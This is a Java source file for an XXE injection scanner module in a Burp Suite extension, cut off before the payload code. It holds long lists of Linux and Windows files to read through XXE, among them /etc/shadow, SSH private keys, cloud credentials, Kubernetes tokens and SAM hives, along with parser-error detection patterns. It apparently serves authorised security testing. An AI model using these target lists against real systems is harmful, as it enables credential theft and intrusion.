package com.omnistrike.modules.injection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.Interaction;
import burp.api.montoya.core.ByteArray;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import com.omnistrike.framework.CollaboratorManager;
import com.omnistrike.framework.DeduplicationStore;
import com.omnistrike.framework.FindingsStore;

import com.omnistrike.model.*;

import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.*;

import java.util.concurrent.atomic.AtomicReference;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * MODULE: XXE (XML External Entity) Injection Scanner
 *
 * Comprehensive XXE detection covering:
 *   - Passive detection of XML content types, existing DTDs, and XML parser errors
 *   - Classic XXE file read (Linux & Windows targets via SYSTEM and PUBLIC entities)
 *   - Error-based XXE (malformed entities and non-existent file references)
 *   - XInclude injection for non-XML parameters embedded in server-side XML
 *   - Blind XXE via OOB using Burp Collaborator (parameter entities, direct entities, data exfiltration)
 *   - Content-Type conversion attacks (JSON-to-XML)
 *
 * False positive prevention:
 *   - File read payloads only reported when response contains known file content markers
 *   - OOB findings require confirmed Collaborator interaction (CERTAIN confidence)
 *   - Error-based findings require specific XML parser error strings not present in baseline
 *   - Deduplication by urlPath + paramName
 */
public class XxeScanner implements ScanModule {

    private MontoyaApi api;
    private ModuleConfig config;
    private DeduplicationStore dedup;
    private FindingsStore findingsStore;
    private CollaboratorManager collaboratorManager;

    // ==================== CONSTANTS: XML CONTENT TYPES ====================

    private static final Set<String> XML_CONTENT_TYPES = Set.of(
            "application/xml",
            "text/xml",
            "application/soap+xml",
            "application/xhtml+xml",
            "application/rss+xml",
            "application/atom+xml",
            "application/xslt+xml",
            "application/mathml+xml",
            "application/rdf+xml",
            "image/svg+xml",
            "application/xop+xml",
            "application/wsdl+xml",
            "application/vnd.google-earth.kml+xml",
            "application/xliff+xml",
            "application/tei+xml",
            "application/xml-dtd",
            "application/xml-external-parsed-entity"
    );

    // ==================== CONSTANTS: FILE READ TARGETS ====================

    /** Linux file targets: each entry is {filePath, evidencePattern, description}. */
    private static final String[][] LINUX_FILE_TARGETS = {
            {"/etc/passwd", "root:x:0:0:", "/etc/passwd"},
            {"/etc/hostname", "", "/etc/hostname"},
            {"/etc/shadow", "root:", "/etc/shadow"},
            {"/etc/group", "root:", "/etc/group"},
            {"/etc/hosts", "localhost", "/etc/hosts"},
            {"/etc/resolv.conf", "nameserver", "/etc/resolv.conf"},
            {"/proc/version", "Linux version", "/proc/version"},
            {"/proc/self/environ", "PATH=", "/proc/self/environ"},
            {"/proc/self/cmdline", "", "/proc/self/cmdline"},
            {"/etc/os-release", "NAME=", "/etc/os-release"},
            {"/etc/issue", "", "/etc/issue"},
            {"/etc/nginx/nginx.conf", "server", "/etc/nginx/nginx.conf"},
            {"/etc/apache2/apache2.conf", "ServerRoot", "/etc/apache2/apache2.conf"},
            {"/var/log/apache2/access.log", "", "/var/log/apache2/access.log"},
            {"/etc/crontab", "", "/etc/crontab"},
            {"/proc/self/status", "Name:", "/proc/self/status"},
            {"/proc/net/tcp", "", "/proc/net/tcp"},
            {"/etc/mysql/my.cnf", "[mysqld]", "/etc/mysql/my.cnf"},
            {"/etc/postgresql/pg_hba.conf", "", "/etc/postgresql/pg_hba.conf"},
            {"/home/.ssh/authorized_keys", "", "/home/.ssh/authorized_keys"},
            {"/root/.bash_history", "", "/root/.bash_history"},
            {"/etc/redis/redis.conf", "", "/etc/redis/redis.conf"},
            {"/etc/fstab", "", "/etc/fstab"},
            {"/etc/profile", "", "/etc/profile"},
            {"/etc/bashrc", "", "/etc/bashrc"},
            {"/etc/environment", "PATH", "/etc/environment"},
            {"/etc/security/limits.conf", "", "/etc/security/limits.conf"},
            {"/etc/sysctl.conf", "", "/etc/sysctl.conf"},
            {"/etc/ssh/sshd_config", "", "/etc/ssh/sshd_config"},
            {"/etc/ssh/ssh_config", "", "/etc/ssh/ssh_config"},
            {"/root/.ssh/authorized_keys", "", "/root/.ssh/authorized_keys"},
            {"/root/.ssh/id_rsa", "-----BEGIN", "/root/.ssh/id_rsa"},
            {"/root/.ssh/id_rsa.pub", "ssh-rsa", "/root/.ssh/id_rsa.pub"},
            {"/root/.ssh/known_hosts", "", "/root/.ssh/known_hosts"},
            {"/proc/self/fd/0", "", "/proc/self/fd/0"},
            {"/proc/self/maps", "", "/proc/self/maps"},
            {"/proc/self/mountinfo", "", "/proc/self/mountinfo"},
            {"/proc/self/cgroup", "", "/proc/self/cgroup"},
            {"/proc/mounts", "", "/proc/mounts"},
            {"/proc/cpuinfo", "processor", "/proc/cpuinfo"},
            {"/proc/meminfo", "MemTotal", "/proc/meminfo"},
            {"/proc/net/arp", "", "/proc/net/arp"},
            {"/proc/net/route", "Iface", "/proc/net/route"},
            {"/proc/net/udp", "", "/proc/net/udp"},
            {"/proc/net/if_inet6", "", "/proc/net/if_inet6"},
            {"/proc/sched_debug", "", "/proc/sched_debug"},
            {"/etc/lsb-release", "", "/etc/lsb-release"},
            {"/etc/redhat-release", "", "/etc/redhat-release"},
            {"/etc/debian_version", "", "/etc/debian_version"},
            {"/etc/alpine-release", "", "/etc/alpine-release"},
            {"/etc/httpd/conf/httpd.conf", "ServerRoot", "/etc/httpd/conf/httpd.conf"},
            {"/etc/lighttpd/lighttpd.conf", "", "/etc/lighttpd/lighttpd.conf"},
            {"/etc/tomcat/server.xml", "", "/etc/tomcat/server.xml"},
            {"/opt/tomcat/conf/server.xml", "", "/opt/tomcat/conf/server.xml"},
            {"/opt/tomcat/conf/tomcat-users.xml", "", "/opt/tomcat/conf/tomcat-users.xml"},
            {"/usr/local/tomcat/conf/server.xml", "", "/usr/local/tomcat/conf/server.xml"},
            {"/usr/local/tomcat/conf/tomcat-users.xml", "", "/usr/local/tomcat/conf/tomcat-users.xml"},
            {"/etc/php/7.4/apache2/php.ini", "[PHP]", "/etc/php/7.4/apache2/php.ini"},
            {"/etc/php/8.0/apache2/php.ini", "[PHP]", "/etc/php/8.0/apache2/php.ini"},
            {"/etc/php/8.1/apache2/php.ini", "[PHP]", "/etc/php/8.1/apache2/php.ini"},
            {"/etc/php/8.2/apache2/php.ini", "[PHP]", "/etc/php/8.2/apache2/php.ini"},
            {"/usr/local/etc/php/php.ini", "[PHP]", "/usr/local/etc/php/php.ini"},
            {"/etc/mongod.conf", "", "/etc/mongod.conf"},
            {"/etc/redis.conf", "", "/etc/redis.conf"},
            {"/etc/elasticsearch/elasticsearch.yml", "", "/etc/elasticsearch/elasticsearch.yml"},
            {"/etc/docker/daemon.json", "", "/etc/docker/daemon.json"},
            {"/var/run/docker.sock", "", "/var/run/docker.sock"},
            {"/etc/kubernetes/admin.conf", "", "/etc/kubernetes/admin.conf"},
            {"/var/run/secrets/kubernetes.io/serviceaccount/token", "", "/var/run/secrets/kubernetes.io/serviceaccount/token"},
            {"/var/run/secrets/kubernetes.io/serviceaccount/ca.crt", "", "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"},
            {"/var/run/secrets/kubernetes.io/serviceaccount/namespace", "", "/var/run/secrets/kubernetes.io/serviceaccount/namespace"},
            {"/etc/mysql/mariadb.conf.d/50-server.cnf", "", "/etc/mysql/mariadb.conf.d/50-server.cnf"},
            {"/var/lib/mysql/mysql/user.MYD", "", "/var/lib/mysql/mysql/user.MYD"},
            {"/etc/postfix/main.cf", "", "/etc/postfix/main.cf"},
            {"/etc/dovecot/dovecot.conf", "", "/etc/dovecot/dovecot.conf"},
            {"/etc/vsftpd.conf", "", "/etc/vsftpd.conf"},
            {"/etc/proftpd/proftpd.conf", "", "/etc/proftpd/proftpd.conf"},
            {"/etc/bind/named.conf", "", "/etc/bind/named.conf"},
            {"/etc/named.conf", "", "/etc/named.conf"},
            {"/etc/ldap/ldap.conf", "", "/etc/ldap/ldap.conf"},
            {"/etc/openldap/slapd.conf", "", "/etc/openldap/slapd.conf"},
            {"/etc/samba/smb.conf", "", "/etc/samba/smb.conf"},
            {"/etc/exports", "", "/etc/exports"},
            {"/var/log/syslog", "", "/var/log/syslog"},
            {"/var/log/auth.log", "", "/var/log/auth.log"},
            {"/var/log/messages", "", "/var/log/messages"},
            {"/var/log/secure", "", "/var/log/secure"},
            {"/var/log/nginx/access.log", "", "/var/log/nginx/access.log"},
            {"/var/log/nginx/error.log", "", "/var/log/nginx/error.log"},
            {"/var/log/apache2/error.log", "", "/var/log/apache2/error.log"},
            {"/var/log/httpd/access_log", "", "/var/log/httpd/access_log"},
            {"/var/log/httpd/error_log", "", "/var/log/httpd/error_log"},
            {"/var/log/mail.log", "", "/var/log/mail.log"},
            {"/etc/supervisor/supervisord.conf", "", "/etc/supervisor/supervisord.conf"},
            {"/etc/pam.d/common-auth", "", "/etc/pam.d/common-auth"},
            {"/etc/pam.d/common-password", "", "/etc/pam.d/common-password"},
            {"/etc/login.defs", "", "/etc/login.defs"},
            {"/etc/sudoers", "", "/etc/sudoers"},
            {"/etc/xinetd.conf", "", "/etc/xinetd.conf"},
            {"/etc/inetd.conf", "", "/etc/inetd.conf"},
            {"/etc/network/interfaces", "", "/etc/network/interfaces"},
            {"/etc/NetworkManager/NetworkManager.conf", "", "/etc/NetworkManager/NetworkManager.conf"},
            {"/etc/apt/sources.list", "", "/etc/apt/sources.list"},
            {"/etc/yum.conf", "", "/etc/yum.conf"},
            {"/etc/proxychains.conf", "", "/etc/proxychains.conf"},
            {"/home/www-data/.bash_history", "", "/home/www-data/.bash_history"},
            {"/home/ubuntu/.bash_history", "", "/home/ubuntu/.bash_history"},
            {"/var/www/html/.htaccess", "", "/var/www/html/.htaccess"},
            {"/var/www/.htpasswd", "", "/var/www/.htpasswd"},
            {"/var/www/html/wp-config.php", "", "/var/www/html/wp-config.php"},
            {"/var/www/html/configuration.php", "", "/var/www/html/configuration.php"},
            {"/var/www/html/config.php", "", "/var/www/html/config.php"},
            {"/opt/bitnami/apps/wordpress/htdocs/wp-config.php", "", "/opt/bitnami/wordpress/wp-config.php"},
            {"/etc/ansible/hosts", "", "/etc/ansible/hosts"},
            {"/etc/salt/master", "", "/etc/salt/master"},
            {"/etc/puppet/puppet.conf", "", "/etc/puppet/puppet.conf"},
            {"/home/git/.gitconfig", "", "/home/git/.gitconfig"},
            {"/etc/gitlab/gitlab.rb", "", "/etc/gitlab/gitlab.rb"},
            {"/etc/grafana/grafana.ini", "", "/etc/grafana/grafana.ini"},
            {"/etc/prometheus/prometheus.yml", "", "/etc/prometheus/prometheus.yml"},
            {"/etc/consul.d/config.json", "", "/etc/consul.d/config.json"},
            {"/etc/vault/config.hcl", "", "/etc/vault/config.hcl"},
            {"/etc/rabbitmq/rabbitmq.config", "", "/etc/rabbitmq/rabbitmq.config"},
            {"/etc/kafka/server.properties", "", "/etc/kafka/server.properties"},
            {"/etc/zookeeper/conf/zoo.cfg", "", "/etc/zookeeper/conf/zoo.cfg"},
            {"/etc/cassandra/cassandra.yaml", "", "/etc/cassandra/cassandra.yaml"},
            {"/etc/couchdb/local.ini", "", "/etc/couchdb/local.ini"},
            {"/etc/neo4j/neo4j.conf", "", "/etc/neo4j/neo4j.conf"},
            {"/opt/solr/server/solr/solr.xml", "", "/opt/solr/server/solr/solr.xml"},
            {"/etc/haproxy/haproxy.cfg", "", "/etc/haproxy/haproxy.cfg"},
            {"/etc/squid/squid.conf", "", "/etc/squid/squid.conf"},
            {"/etc/varnish/default.vcl", "", "/etc/varnish/default.vcl"},
            {"/etc/openvpn/server.conf", "", "/etc/openvpn/server.conf"},
            {"/etc/wireguard/wg0.conf", "", "/etc/wireguard/wg0.conf"},
            {"/etc/ipsec.conf", "", "/etc/ipsec.conf"},
            {"/etc/snmp/snmpd.conf", "", "/etc/snmp/snmpd.conf"},
            {"/etc/nagios/nagios.cfg", "", "/etc/nagios/nagios.cfg"},
            {"/etc/zabbix/zabbix_server.conf", "", "/etc/zabbix/zabbix_server.conf"},
            {"/root/.my.cnf", "", "/root/.my.cnf"},
            {"/root/.pgpass", "", "/root/.pgpass"},
            {"/root/.mongorc.js", "", "/root/.mongorc.js"},
            {"/root/.aws/credentials", "", "/root/.aws/credentials"},
            {"/root/.aws/config", "", "/root/.aws/config"},
            {"/home/ubuntu/.aws/credentials", "", "/home/ubuntu/.aws/credentials"},
            {"/root/.docker/config.json", "", "/root/.docker/config.json"},
            {"/root/.kube/config", "", "/root/.kube/config"},
            {"/root/.gitconfig", "", "/root/.gitconfig"},
            {"/root/.npmrc", "", "/root/.npmrc"},
            {"/root/.env", "", "/root/.env"},
            {"/opt/app/.env", "", "/opt/app/.env"},
            {"/var/www/.env", "", "/var/www/.env"},
            {"/var/www/html/.env", "", "/var/www/html/.env"},
            {"/app/.env", "", "/app/.env"},
            {"/proc/1/cmdline", "", "/proc/1/cmdline"},
            {"/proc/1/environ", "", "/proc/1/environ"},
            {"/proc/self/exe", "", "/proc/self/exe"},
    };

    /** Windows file targets: each entry is {filePath, evidencePattern, description}. */
    private static final String[][] WINDOWS_FILE_TARGETS = {
            {"C:/Windows/win.ini", "[fonts]", "C:\\Windows\\win.ini"},
            {"C:/Windows/System32/drivers/etc/hosts", "localhost", "C:\\Windows\\System32\\drivers\\etc\\hosts"},
            {"C:/boot.ini", "[boot loader]", "C:\\boot.ini"},
            {"C:/Windows/system.ini", "[drivers]", "C:\\Windows\\system.ini"},
            {"C:/Windows/php.ini", "[PHP]", "C:\\Windows\\php.ini"},
            {"C:/inetpub/wwwroot/web.config", "configuration", "C:\\inetpub\\wwwroot\\web.config"},
            {"C:/Windows/debug/NetSetup.log", "", "C:\\Windows\\debug\\NetSetup.log"},
            {"C:/Windows/repair/sam", "", "C:\\Windows\\repair\\sam"},
            {"C:/Windows/Panther/Unattend.xml", "", "C:\\Windows\\Panther\\Unattend.xml"},
            {"C:/Windows/Panther/unattend.xml", "", "C:\\Windows\\Panther\\unattend.xml"},
            {"C:/inetpub/logs/LogFiles", "", "C:\\inetpub\\logs\\LogFiles"},
            {"C:/xampp/apache/conf/httpd.conf", "ServerRoot", "C:\\xampp\\apache\\conf\\httpd.conf"},
            {"C:/ProgramData/MySQL/MySQL Server 5.7/my.ini", "", "C:\\ProgramData\\MySQL\\my.ini"},
            {"C:/Windows/System32/inetsrv/config/applicationHost.config", "", "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config"},
            {"C:/Windows/repair/system", "", "C:\\Windows\\repair\\system"},
            {"C:/Windows/repair/security", "", "C:\\Windows\\repair\\security"},
            {"C:/Windows/repair/software", "", "C:\\Windows\\repair\\software"},
            {"C:/Windows/repair/default", "", "C:\\Windows\\repair\\default"},
            {"C:/Windows/System32/config/SAM", "", "C:\\Windows\\System32\\config\\SAM"},
            {"C:/Windows/System32/config/SYSTEM", "", "C:\\Windows\\System32\\config\\SYSTEM"},
            {"C:/Windows/System32/config/SOFTWARE", "", "C:\\Windows\\System32\\config\\SOFTWARE"},
            {"C:/Windows/System32/config/SECURITY", "", "C:\\Windows\\System32\\config\\SECURITY"},
            {"C:/Windows/System32/config/RegBack/SAM", "", "C:\\Windows\\System32\\config\\RegBack\\SAM"},
            {"C:/Windows/System32/config/RegBack/SYSTEM", "", "C:\\Windows\\System32\\config\\RegBack\\SYSTEM"},
            {"C:/Windows/System32/WindowsPowerShell/v1.0/profile.ps1", "", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1"},
            {"C:/Users/Administrator/NTUser.dat", "", "C:\\Users\\Administrator\\NTUser.dat"},
            {"C:/Users/Administrator/Desktop/desktop.ini", "", "C:\\Users\\Administrator\\Desktop\\desktop.ini"},
            {"C:/Users/Administrator/.ssh/authorized_keys", "", "C:\\Users\\Administrator\\.ssh\\authorized_keys"},
            {"C:/Users/Administrator/.ssh/id_rsa", "-----BEGIN", "C:\\Users\\Administrator\\.ssh\\id_rsa"},
            {"C:/Users/All Users/Application Data/MySQL/MySQL Server 5.7/my.ini", "", "C:\\ProgramData\\MySQL\\5.7\\my.ini"},
            {"C:/ProgramData/MySQL/MySQL Server 8.0/my.ini", "", "C:\\ProgramData\\MySQL\\8.0\\my.ini"},
            {"C:/xampp/mysql/bin/my.ini", "", "C:\\xampp\\mysql\\bin\\my.ini"},
            {"C:/xampp/phpMyAdmin/config.inc.php", "", "C:\\xampp\\phpMyAdmin\\config.inc.php"},
            {"C:/xampp/sendmail/sendmail.ini", "", "C:\\xampp\\sendmail\\sendmail.ini"},
            {"C:/xampp/apache/conf/extra/httpd-vhosts.conf", "", "C:\\xampp\\apache\\conf\\extra\\httpd-vhosts.conf"},
            {"C:/xampp/php/php.ini", "[PHP]", "C:\\xampp\\php\\php.ini"},
            {"C:/wamp/bin/apache/apache2.4.9/conf/httpd.conf", "ServerRoot", "C:\\wamp\\bin\\apache\\conf\\httpd.conf"},
            {"C:/wamp/bin/php/php5.5.12/php.ini", "[PHP]", "C:\\wamp\\bin\\php\\php.ini"},
            {"C:/inetpub/wwwroot/default.aspx", "", "C:\\inetpub\\wwwroot\\default.aspx"},
            {"C:/inetpub/wwwroot/global.asa", "", "C:\\inetpub\\wwwroot\\global.asa"},
            {"C:/Windows/Microsoft.NET/Framework/v4.0.30319/Config/machine.config", "", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Config\\machine.config"},
            {"C:/Windows/Microsoft.NET/Framework/v4.0.30319/Config/web.config", "", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Config\\web.config"},
            {"C:/Windows/Microsoft.NET/Framework64/v4.0.30319/Config/machine.config", "", "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\machine.config"},
            {"C:/Program Files/Apache Software Foundation/Tomcat 9.0/conf/server.xml", "", "C:\\Program Files\\Apache Software Foundation\\Tomcat 9.0\\conf\\server.xml"},
            {"C:/Program Files/Apache Software Foundation/Tomcat 9.0/conf/tomcat-users.xml", "", "C:\\Program Files\\Tomcat 9.0\\conf\\tomcat-users.xml"},
            {"C:/Program Files/Apache Software Foundation/Tomcat 9.0/conf/web.xml", "", "C:\\Program Files\\Tomcat 9.0\\conf\\web.xml"},
            {"C:/Program Files (x86)/Apache Software Foundation/Tomcat 9.0/conf/server.xml", "", "C:\\Program Files (x86)\\Tomcat 9.0\\conf\\server.xml"},
            {"C:/Windows/Temp", "", "C:\\Windows\\Temp"},
            {"C:/Windows/WindowsUpdate.log", "", "C:\\Windows\\WindowsUpdate.log"},
            {"C:/Windows/System32/sysprep/sysprep.xml", "", "C:\\Windows\\System32\\sysprep\\sysprep.xml"},
            {"C:/Windows/System32/sysprep/unattend.xml", "", "C:\\Windows\\System32\\sysprep\\unattend.xml"},
            {"C:/Program Files/MySQL/MySQL Server 5.7/my.ini", "", "C:\\Program Files\\MySQL\\5.7\\my.ini"},
            {"C:/Program Files/MySQL/MySQL Server 8.0/my.ini", "", "C:\\Program Files\\MySQL\\8.0\\my.ini"},
            {"C:/Program Files/PostgreSQL/14/data/pg_hba.conf", "", "C:\\Program Files\\PostgreSQL\\14\\data\\pg_hba.conf"},
            {"C:/Program Files/PostgreSQL/14/data/postgresql.conf", "", "C:\\Program Files\\PostgreSQL\\14\\data\\postgresql.conf"},
            {"C:/Program Files/Microsoft SQL Server/MSSQL15.MSSQLSERVER/MSSQL/LOG/ERRORLOG", "", "C:\\Program Files\\Microsoft SQL Server\\MSSQL\\LOG\\ERRORLOG"},
            {"C:/Program Files/Redis/redis.windows.conf", "", "C:\\Program Files\\Redis\\redis.windows.conf"},
            {"C:/Program Files/OpenSSH/etc/sshd_config", "", "C:\\Program Files\\OpenSSH\\etc\\sshd_config"},
            {"C:/ProgramData/Jenkins/.jenkins/secrets/master.key", "", "C:\\ProgramData\\Jenkins\\.jenkins\\secrets\\master.key"},
            {"C:/ProgramData/Jenkins/.jenkins/secrets/initialAdminPassword", "", "C:\\ProgramData\\Jenkins\\.jenkins\\secrets\\initialAdminPassword"},
            {"C:/Users/Administrator/.aws/credentials", "", "C:\\Users\\Administrator\\.aws\\credentials"},
            {"C:/Users/Administrator/.azure/accessTokens.json", "", "C:\\Users\\Administrator\\.azure\\accessTokens.json"},
            {"C:/Users/Administrator/.kube/config", "", "C:\\Users\\Administrator\\.kube\\config"},
            {"C:/Users/Administrator/.docker/config.json", "", "C:\\Users\\Administrator\\.docker\\config.json"},
            {"C:/Windows/System32/LogFiles/W3SVC1/u_ex210101.log", "", "C:\\Windows\\System32\\LogFiles\\W3SVC1\\IIS_log"},
    };

    // ==================== CONSTANTS: XML PARSER ERROR PATTERNS ====================

    private static final Pattern XML_PARSER_ERROR_PATTERN = Pattern.compile(
            "XML\\s*pars(?:ing|er)\\s*error"
                    + "|SAXParseException"
                    + "|SAXException"
                    + "|XMLSyntaxError"
                    + "|lxml\\.etree"
                    + "|simplexml_load_string"
                    + "|DOMDocument::load"
                    + "|xmlParseEntityRef"
                    + "|xmlParseCharRef"
                    + "|StartTag.*EndTag"
                    + "|Content is not allowed in prolog"
                    + "|The markup in the document following the root element must be well-formed"
                    + "|Premature end of data"
                    + "|not well-formed"
                    + "|org\\.xml\\.sax"
                    + "|javax\\.xml\\.parsers"
                    + "|System\\.Xml"
                    + "|REXML"
                    + "|Nokogiri"
                    + "|unterminated entity reference"
                    + "|Undeclared general entity"
                    + "|undefined entity"
                    + "|Invalid character reference"
                    + "|DOCTYPE.*not allowed"
                    + "|external entity"
                    + "|entity expansion"
                    + "|EntityRef"
                    + "|PCDATA invalid Char"
                    + "|xml\\.etree\\.ElementTree"
                    + "|xerces"
                    + "|XmlReader"
                    + "|XDocument"
                    + "|XElement"
                    + "|XPathException"
                    + "|TransformerException"
                    + "|DOMException"
                    + "|XMLReader"
                    + "|xml\\.dom\\.minidom"
                    + "|defusedxml"
                    + "|Error parsing XML"
                    + "|XML declaration allowed only at the start"
                    + "|xml\\.parsers\\.expat"
                    + "|ExpatError"
                    + "|XmlException"
                    + "|javax\\.xml\\.stream"
                    + "|javax\\.xml\\.transform"
                    + "|javax\\.xml\\.xpath"
                    + "|javax\\.xml\\.bind"
                    + "|javax\\.xml\\.validation"
                    + "|org\\.w3c\\.dom"
                    + "|org\\.jdom"
                    + "|org\\.dom4j"
                    + "|nu\\.xom"
                    + "|com\\.ctc\\.wstx"
                    + "|com\\.fasterxml\\.jackson\\.dataformat\\.xml"
                    + "|com\\.sun\\.org\\.apache\\.xerces"
                    + "|XmlPullParserException"
                    + "|XmlSyntaxException"
                    + "|XmlNodeSyntaxError"
                    + "|libxml2"
                    + "|XML::Parser"
                    + "|XML::LibXML"
                    + "|XML::Simple"
                    + "|XML::Twig"
                    + "|Msxml2\\.DOMDocument"
                    + "|MSXML"
                    + "|XslTransformException"
                    + "|System\\.Xml\\.Linq"
                    + "|System\\.Xml\\.XmlDocument"
                    + "|System\\.Xml\\.XPath"
                    + "|System\\.Xml\\.Xsl"
                    + "|System\\.Xml\\.Schema"
                    + "|XmlTextReader"
                    + "|XmlDocument\\.Load"
                    + "|XmlDocument\\.LoadXml"
                    + "|XmlSerializer"
                    + "|XmlConvert"
                    + "|xml\\.sax\\.handler"
                    + "|xml\\.sax\\.make_parser"
                    + "|xml\\.sax\\.parse"
                    + "|pulldom"
                    + "|minidom\\.parse"
                    + "|html5lib"
                    + "|xmltodict"
                    + "|cElementTree"
                    + "|ElementTree\\.parse"
                    + "|XMLStreamException"
                    + "|StAXResult"
                    + "|XMLInputFactory"
                    + "|XMLOutputFactory"
                    + "|DocumentBuilder"
                    + "|DocumentBuilderFactory"
                    + "|XMLEventReader"
                    + "|Unmarshaller"
                    + "|SchemaFactory"
                    + "|TransformerFactory"
                    + "|XPathExpression"
                    + "|XPathFactory"
                    + "|SAXReader"
                    + "|SAXBuilder",
            Pattern.CASE_INSENSITIVE
    );

    /** Patterns indicating DTD/entity processing in the parser (error-based confirmation). */
    private static final Pattern DTD_PROCESSING_ERROR_PATTERN = Pattern.compile(
            "DOCTYPE.*not allowed"
                    + "|external entity"
                    + "|entity expansion"
                    + "|undeclared.*entity"
                    + "|undefined entity"
                    + "|EntityRef"
                    + "|ENTITY.*not found"
                    + "|unable to load external entity"
                    + "|failed to load external entity"
                    + "|I/O error.*(?:file|http)"
                    + "|java\\.io\\.FileNotFoundException"
                    + "|java\\.net\\.(?:MalformedURL|Connect|UnknownHost)Exception"
                    + "|System\\.IO\\.FileNotFoundException"
                    + "|System\\.Net\\.WebException"
                    + "|No such file or directory"
                    + "|Access.*denied"
                    + "|Permission denied"
                    + "|Could not open"
                    + "|failed to open stream"
                    + "|entity.*?reference"
                    + "|DTD.*?not allowed"
                    + "|disallow.*?DOCTYPE"
                    + "|DOCTYPE.*?disallowed"
                    + "|Entities are not allowed"
                    + "|entity.*?expansion.*?limit"
                    + "|too many entity references"
                    + "|recursive entity reference"
                    + "|entity.*?recursion"
                    + "|maximum entity.*?depth"
                    + "|billion laughs"
                    + "|xml.*?bomb"
                    + "|entity.*?loop"
                    + "|entity.*?denied"
                    + "|entity.*?forbidden"
                    + "|entity.*?prohibited"
                    + "|DTD is prohibited"
                    + "|DTD processing.*?disabled"
                    + "|external.*?subset"
                    + "|parameter entity"
                    + "|general entity"
                    + "|parsed entity"
                    + "|unparsed entity"
                    + "|entity.*?not defined"
                    + "|entity.*?not declared"
                    + "|entity.*?not recognized"
                    + "|entity.*?resolution"
                    + "|entity.*?resolver"
                    + "|failed to resolve entity"
                    + "|cannot resolve entity"
                    + "|could not resolve entity"
                    + "|error resolving entity"
                    + "|entity.*?exceeds"
                    + "|entity.*?nesting"
                    + "|entity.*?depth.*?exceeded"
                    + "|entity.*?size.*?limit"
                    + "|entity.*?count.*?limit"
                    + "|maxOccurs.*?limit"
                    + "|FEATURE_SECURE_PROCESSING"
                    + "|DtdProcessing\\.Prohibit"
                    + "|libxml_disable_entity_loader"
                    + "|LIBXML_NOENT"
                    + "|XmlResolver"
                    + "|XmlUrlResolver"
                    + "|setFeature.*?external"
                    + "|disallow-doctype-decl"
                    + "|external-general-entities"
                    + "|external-parameter-entities"
                    + "|XMLConstants\\.ACCESS_EXTERNAL_DTD"
                    + "|XMLConstants\\.ACCESS_EXTERNAL_SCHEMA"
                    + "|XMLConstants\\.ACCESS_EXTERNAL_STYLESHEET",
            Pattern.CASE_INSENSITIVE
    );

    // ==================== CONSTANTS: FILE CONTENT EVIDENCE PATTERNS ====================

    /** Patterns that confirm actual file content was returned (for false positive prevention). */
    private static final Pattern LINUX_PASSWD_EVIDENCE = Pattern.compile("root:[x*]:0:0:");
    private static final Pattern WINDOWS_WIN_INI_EVIDENCE = Pattern.compile("\\[fonts\\]", Pattern.CASE_INSENSITIVE);
    private static final Pattern WINDOWS_HOSTS_EVIDENCE = Pattern.compile("localhost", Pattern.CASE_INSENSITIVE);

    // ==================== OVERRIDES ====================

    @Override
    public String getId() { return "xxe-scanner"; }

    @Override
    public String getName() { return "XXE Scanner"; }

    @Override
    public String getDescription() {
        return "XML External Entity injection detection via classic file read, error-based, XInclude, "
                + "blind OOB (Collaborator), and Content-Type conversion attacks.";
    }

    @Override
    public ModuleCategory getCategory() { return ModuleCategory.INJECTION; }

    @Override
    public boolean isPassive() { return false; }

    @Override
    public void initialize(MontoyaApi api, ModuleConfig config) {
        this.api = api;
        this.config = config;
    }

    public void setDependencies(DeduplicationStore dedup, FindingsStore findingsStore,
                                 CollaboratorManager collaboratorManager) {
        this.dedup = dedup;
        this.findingsStore = findingsStore;
        this.collaboratorManager = collaboratorManager;
    }

    // ==================== MAIN ENTRY POINT ====================

    @Override
    public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
        HttpRequest request = requestResponse.request();
        HttpResponse response = requestResponse.response();
        String url = request.url();
        String urlPath = extractPath(url);
        String contentType = getContentType(request);

        // -------- PASSIVE ANALYSIS --------
        passiveAnalysis(requestResponse, url, contentType);

        // -------- ACTIVE TESTING --------
        boolean isXmlRequest = isXmlContentType(contentType);
        boolean isJsonRequest = contentType != null && contentType.contains("application/json");

        // Fingerprint the target to tailor payloads (OS + runtime detection)
        TargetFingerprint fingerprint = fingerprint(requestResponse);
        if (fingerprint.os != DetectedOS.UNKNOWN || fingerprint.runtime != DetectedRuntime.UNKNOWN) {
            api.logging().logToOutput("[XXE] Fingerprint: OS=" + fingerprint.os
                    + " Runtime=" + fingerprint.runtime + " for " + url);
        }

        // Phase 1: If the request body is already XML, test the XML body directly
        if (isXmlRequest) {
            if (dedup.markIfNew("xxe-scanner", urlPath, "__xml_body__")) {
                try {
                    testXmlBody(requestResponse, url, fingerprint);
                } catch (Exception e) {
                    api.logging().logToError("XXE XML body test error: " + e.getMessage());
                }
            }
        }

        // Phase 2: XInclude injection in individual parameters
        if (config.getBool("xxe.xinclude.enabled", true)) {
            List<XxeTarget> paramTargets = extractParameterTargets(request);
            for (XxeTarget target : paramTargets) {
                if (!dedup.markIfNew("xxe-xinclude", urlPath, target.name)) continue;
                try {
                    testXInclude(requestResponse, target, url);
                } catch (Exception e) {
                    api.logging().logToError("XXE XInclude test error on " + target.name + ": " + e.getMessage());
                }
            }
        }

        // Phase 3: Content-Type conversion (JSON -> XML)
        if (config.getBool("xxe.contentTypeConversion.enabled", true) && isJsonRequest) {
            if (dedup.markIfNew("xxe-convert", urlPath, "__json_to_xml__")) {
                try {
                    testContentTypeConversion(requestResponse, url);
                } catch (Exception e) {
                    api.logging().logToError("XXE Content-Type conversion test error: " + e.getMessage());
                }
            }
        }

        return Collections.emptyList();
    }

    // ==================== PASSIVE ANALYSIS ====================

    /**
     * Passive detection: identifies XML content types, existing DTDs in request bodies,
     * and XML parsing errors in responses.
     */
